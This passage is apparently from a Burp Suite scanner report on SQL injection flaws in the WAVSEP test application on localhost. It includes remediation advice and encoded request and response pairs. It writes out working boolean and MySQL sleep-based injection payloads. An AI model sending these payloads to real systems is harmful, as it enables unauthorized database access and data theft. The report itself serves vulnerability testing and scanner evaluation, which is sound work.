      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSklMmInJnBhc3N3b3JkPXRleHR2YWx1ZTIgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjM3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7265041309852519424</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>26599761' or 5971=5971-- </b> and <b>40259348' or 7577=7582-- </b> were each submitted in the msg parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/bXNnPXRleHR2YWx1ZTI2NTk5NzYxJyUyMG9yJTIwNTk3MSUzZDU5NzEtLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjM2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MjANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMQo8L1REPgo8VEQ+CldlbGNvbWUgdG8gdGhlIHdlYiBzaXRlCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpSZW1lbWJlciB0byBjaGFuZ2UgeW91ciBwYXNzd29yZAo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgozCjwvVEQ+CjxURD4KWW91ciBhY2NvdW50IGlzIGFib3V0IHRvIGV4cGlyZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/bXNnPXRleHR2YWx1ZTQwMjU5MzQ4JyUyMG9yJTIwNzU3NyUzZDc1ODItLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjM2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjM3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6571958051785750528</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>76684376' or '8484'='8484</b> and <b>95332156' or '8465'='8470</b> were each submitted in the username parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20065</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlNzY2ODQzNzYnJTIwb3IlMjAnODQ4NCclM2QnODQ4NCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjE4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIHVzZXJzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlOTUzMzIxNTYnJTIwb3IlMjAnODQ2NSclM2QnODQ3MCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
